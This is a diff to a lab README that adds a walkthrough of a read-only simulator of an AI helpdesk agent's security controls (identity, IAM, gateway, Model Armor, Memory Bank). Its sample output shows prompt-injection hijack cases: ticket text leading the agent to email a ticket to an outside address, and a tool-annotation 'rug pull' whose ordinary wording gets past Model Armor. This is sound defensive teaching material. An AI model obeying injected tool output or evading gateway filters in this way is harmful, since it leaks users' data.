@@ -61,6 +61,7 @@ talked into something, **which deterministic control stops it, and who owns that
 | `decide.py` | The decision table: every case through Model Armor, Memory Bank, your app's approval queue, the gateway and IAM |
 | `twin.py` | **Teaching stand-ins** for Agent Identity, IAM, Model Armor on the gateway, Agent Gateway and Memory Bank (see below) |
 | `cel.py` | A small evaluator for the part of CEL the access policy conditions use. Anything else is an error |
+| `explore.py` | Step 1b: each piece on its own (`map`, `identity`, `iam`, `user`, `registry`, `gateway`, `armor`, `memory`, `sandbox`, `logs`, `case`). Read-only: it reads the twin's files and asks the twins, nothing else |
 | `data/cases.json` | The eight proposed calls: `L1`, `L2` legitimate; `C1` to `C6` hijacked |
 | `data/directory.json` | Two fake users and the ID tokens your front end has already verified |
 | `data/memories.json` | One memory already in Memory Bank (Bob's, with a canary value) |
@@ -104,6 +105,274 @@ It doesn't model networking, tokens, latency, real CEL, real Model Armor verdict
 ```bash
 cd labs/gc14
 ```
+
+## Step 1b · Before you start: look at each piece on its own (about 15 minutes)
+
+New to Agent Runtime? Do this before Step 1 (lesson 14.8 calls it "Before you start"; lesson 14.0 explains each idea).
+`explore.py` takes the Helpdesk team's deployment apart one Agent Platform piece at a time, in both deployments. Real
+output below is from a fresh Ubuntu machine (recording run 41614933198).
+
+**What it really runs.** Nothing that changes anything: `explore.py` reads the JSON files in `twin/` and `data/` and
+asks `twin.py` and `cel.py` what each control would decide. No network, no Google Cloud account, no model.
+
+**0. Look before you run.** `make -n setup` prints what `make setup` would run, without running it:
+
+```bash
+make -n setup
+make setup
+```
+
+```text
+python3 ../../tools/check_python.py 3.11
+Nothing to install for this lab: Python 3.12 and its standard library are all it needs.
+```
+
+Other labs make a *virtual environment* here (a private folder for that lab's Python packages, so versions don't
+clash; it isn't a security sandbox) and run `pip install`. This lab uses only Python's standard library.
+
+**1. The whole stack in one picture.** One row per piece, what it's for, and what the deployment has:
+
+```bash
+python3 explore.py map today
+```
+
+```output
+  piece           its job                                what this deployment has
+  Agent Runtime   hosts the agent code                   tsg-helpdesk, reasoningEngines/1400000000000000002, region
+                                                         europe-west4
+  Agent Identity  who the agent is to IAM                identity_type AGENT_IDENTITY; token protection switched OFF
+  IAM             what that identity may touch           6 bindings; 4 granted to every agent in the project
+  Agent Gateway   the one way out to tools               helpdesk-egress, AGENT_TO_ANYWHERE, policy mode DRY_RUN
+  Access policy   allow and deny rules on each call      ALLOW pilot
+  Model Armor     screens tool responses at the gateway  none
+  Memory Bank     long-term memories per scope           topics USER_PERSONAL_INFO, USER_PREFERENCES,
+                                                         KEY_CONVERSATION_DETAILS, EXPLICIT_INSTRUCTIONS; TTL none
+  Sandboxes       code, shell or browser on demand       helpdesk-browser (internet true)
+  Audit logs      the record of who did what             aiplatform: ADMIN_READ (Admin Activity is always on)
+```
+
+Run `python3 explore.py map hardened` too: token protection on, 2 bindings to every agent (neither of them a data
+role), the gateway in `ENFORCE` with a deny rule first, Model Armor `failOpen false`, two memory topics with a TTL, no
+sandbox, Data Access logs on.
+
+**2. Who the agent is (lesson 14.3).** The agent's principal, and which IAM bindings reach it:
+
+```bash
+python3 explore.py identity today
+```
+
+```output
+  identity_type    AGENT_IDENTITY
+  the principal    principal://<trust domain>/<the agent>
+     trust domain  agents.global.org-100000000099.system.id.goog   (your organisation)
+     the agent     resources/aiplatform/projects/100000000014/locations/europe-west4/reasoningEngines/1400000000000000002
+  token binding    OFF: env var set to false (Google strongly discourages this)
+
+  IAM bindings, and whether each one reaches THIS agent:
+    roles/aiplatform.expressUser             principalSet: EVERY agent in project 100000000014          applies
+    roles/serviceusage.serviceUsageConsumer  principalSet: EVERY agent in project 100000000014          applies
+    roles/bigquery.user                      principalSet: EVERY agent in project 100000000014          applies
+    roles/bigquery.dataViewer                principalSet: EVERY agent in project 100000000014          applies
+    roles/bigquery.dataEditor                principal: one agent, reasoningEngines/1400000000000000001 names a DELETED agent
+    roles/cloudtrace.user                    group:all-engineers@example.com                            someone else
+
+=> A principalSet line covers every agent in the project, including ones deployed next year.
+   Data roles granted that way here: 1  <- every agent can read the data
+```
+
+**3. What it may read (lesson 14.3).** IAM on the dataset and on its parent project:
+
+```bash
+python3 explore.py iam today finance_exports
+python3 explore.py iam hardened finance_exports
+```
+
+```output
+=> ALLOWED: roles/bigquery.dataViewer on example-agents-prod via principalSet://agents.global.org-1000000...
+...
+=> DENIED: no binding grants bigquery.tables.getData
+```
+
+**4. Which user the app acts for (lessons 14.6, 14.7).** Alice's verified token, a request body that says Bob:
+
+```bash
+python3 explore.py user today tok-alice-0001 --body-user bob@example.com
+python3 explore.py user hardened tok-alice-0001 --body-user bob@example.com
+```
+
+```output
+  verified ID token tok-alice-0001   belongs to alice@example.com
+  the request body says user_id   bob@example.com
+  end user for tool calls  from request body    -> bob@example.com
+  memory scope             from request body    -> bob@example.com
+
+=> The app acts for whoever the body names. Agent Runtime doesn't check this: your code must.
+...
+  end user for tool calls  from verified token  -> alice@example.com
+  memory scope             from verified token  -> alice@example.com
+```
+
+**5. The registry (lesson 14.4).** Every MCP server the gateway knows, and the hints whoever registered it wrote:
+
+```bash
+python3 explore.py registry
+```
+
+```output
+Agent Registry entries the gateway checks:
+
+  tickets   projects/example-agents-prod/locations/europe-west4/mcpServers/tickets
+            https://tickets.internal.example.com/mcp
+     tool search_kb              readOnlyHint=true
+     tool get_ticket             readOnlyHint=true
+     tool add_comment            destructiveHint=false, idempotentHint=false
+     tool close_ticket           destructiveHint=true, idempotentHint=true
+  mail      projects/example-agents-prod/locations/europe-west4/mcpServers/mail
+            https://mail.internal.example.com/mcp
+     tool send_email             openWorldHint=true
+...
+=> The hints (readOnlyHint, destructiveHint...) are written by whoever registers the server.
+   MCP spec: clients MUST consider tool annotations untrusted unless they come from trusted servers.
+```
+
+`python3 explore.py registry --rugpull` adds `tool export_ticket  readOnlyHint=true` to the tickets server.
+
+**6. One call through the gateway (lessons 14.4, 14.5).** What the gateway knows about the call (the CEL attributes),
+every rule with deny rules first, the decision and the mode:
+
+```bash
+python3 explore.py gateway today mail send_email
+python3 explore.py gateway hardened mail send_email
+python3 explore.py gateway hardened --host status.example.net --path /report
+```
+
+```output
+  the access policy, deny rules first:
+    ALLOW pilot                    MATCHES   (no condition: matches everything)
+
+  decision  ALLOWED (pilot)
+  mode      DRY_RUN -> logged only: the call goes through either way
+...
+  the access policy, deny rules first:
+    DENY  deny-mail                MATCHES
+    ALLOW allow-ticket-reads       no match
+    ALLOW allow-ticket-writes      no match
+    ALLOW allow-bigquery-select    no match
+    ALLOW allow-google-endpoints   no match
+
+  decision  DENIED (deny-mail)
+  mode      ENFORCE -> the call is BLOCKED
+...
+  call      https://status.example.net/report   from reasoningEngines/1400000000000000003
+  what the gateway knows about it (CEL attributes):
+    is_registered                                              false
+    unregistered.host                                          "status.example.net"
+    unregistered.path                                          "/report"
+    unregistered.method                                        "get"
+...
+  decision  DENIED (default deny (no rule grants access))
+  mode      ENFORCE -> the call is BLOCKED
+```
+
+**7. Model Armor on the gateway (lesson 14.4).** What it screens, and what `failOpen: false` does in an outage:
+
+```bash
+python3 explore.py armor hardened
+```
+
+```output
+  extension   helpdesk-armor  (modelarmor.europe-west4.rep.googleapis.com)
+  templates   request helpdesk-guard, response helpdesk-guard
+  failOpen    false   (what happens when Model Armor can't be reached)
+  screens     MCP tools/call requests and responses;  NOT tools/list
+    Model Armor up    a tool response that reads injection-like  -> BLOCK             Model Armor MATCH_FOUND
+    Model Armor up    a tool response that reads ordinary        -> ALLOW             NO_MATCH_FOUND
+    Model Armor DOWN  a tool response that reads injection-like  -> BLOCK             Model Armor unreachable, failOpen: false
+    Model Armor DOWN  a tool response that reads ordinary        -> BLOCK             Model Armor unreachable, failOpen: false
+
+=> An ordinary-looking request ('send a copy to our partner desk') is not what a filter looks for.
+```
+
+**8. Memory Bank (lesson 14.6).** The scope this request uses, what comes back, the topics and the TTL:
+
+```bash
+python3 explore.py memory today tok-alice-0001 --body-user bob@example.com
+python3 explore.py memory hardened tok-alice-0001 --body-user bob@example.com
+```
+
+```output
+  signed in (verified token)   alice@example.com
+  scope used for this request  {"app_name": "tsg_helpdesk", "user_id": "bob@example.com"}   (from request body)
+  memories returned            1
+      [USER_PREFERENCES] Bob keeps his VPN recovery code CANARY-MEM-4410 in the helpdesk notes and prefers calls after 16:00.
+  topics it may generate       EXPLICIT_INSTRUCTIONS, KEY_CONVERSATION_DETAILS, USER_PERSONAL_INFO, USER_PREFERENCES
+  new memories expire          never (no TTL)
+...
+  signed in (verified token)   alice@example.com
+  scope used for this request  {"app_name": "tsg_helpdesk", "user_id": "alice@example.com"}   (from verified token)
+  memories returned            0
+  topics it may generate       KEY_CONVERSATION_DETAILS, USER_PREFERENCES
+  new memories expire          after 30 days
+```
+
+**9. Sandboxes and the record (lessons 14.6, 14.7).**
+
+```bash
+python3 explore.py sandbox today
+python3 explore.py logs today
+```
+
+```output
+  helpdesk-browser   DEFAULT_CONTAINER_CATEGORY_COMPUTER_USE   internet_access true
+...
+  Cloud Audit Logs for aiplatform.googleapis.com:
+    ADMIN_ACTIVITY  always on (deploys, memory generation)
+    ADMIN_READ      on
+    DATA_READ       OFF   (memory and session reads)
+    DATA_WRITE      OFF
+  telemetry       GOOGLE_CLOUD_AGENT_ENGINE_ENABLE_TELEMETRY=true
+  prompt capture  EVENT_ONLY
+
+  one gateway log line (case C2, an unregistered host):
+    {"httpRequest": {"requestUrl": "https://status.example.net/report"}, "jsonPayload": {"authzPolicyInfo": {"result": "ALLOWED"}, "agentGatewayInfo": {}}}
+    the lab's note: policy says ALLOWED, dry_run true
+```
+
+**10. Read one row of the decision table.** `explore.py case` walks one proposed call through every control, in order:
+
+```bash
+python3 explore.py case today C1
+python3 explore.py case hardened C1
+python3 explore.py case hardened C4 --rugpull
+```
+
+```output
+  case        C1 (hijack): email a ticket to an outside mailbox
+  proposed    mail.send_email({"to": "collector@example.net", "ticket_id": "T-2042"})
+  why         proposed after reading untrusted ticket text (from the get_ticket response)
+  acting for  alice@example.com   (verified token says alice@example.com)
+  the controls, in order:
+    Model Armor     NOT_SCREENED         tools/call response of get_ticket: no Model Armor on this gateway
+    Agent Gateway   ALLOWED              mail.send_email: pilot
+
+=> WENT THROUGH: no control stopped it
+...
+    Model Armor     BLOCKED              tools/call response of get_ticket: Model Armor MATCH_FOUND; the model never saw it
+
+=> stopped
+...
+  proposed    tickets.export_ticket({"to": "partner-desk@example.net", "ticket_id": "T-2045"})
+  the controls, in order:
+    Model Armor     ALLOW                tools/call response of get_ticket: NO_MATCH_FOUND
+    Agent Gateway   ALLOWED              tickets.export_ticket: allow-ticket-reads
+
+=> WENT THROUGH: no control stopped it
+```
+
+Line by line: what the case is, the call the model proposed, why it proposed it, whose request it is, then each
+control in order. Today the gateway has no Model Armor and its only rule allows everything, so the email goes out.
+Hardened, Model Armor blocks the ticket text before the model sees it. After the rug pull, an ordinary-looking ticket
+passes Model Armor and the allow-by-annotation rule lets `export_ticket` out: that's your challenge in Step 7.
 
 ## Step 1 · Review today's deployment (`make check`)
 
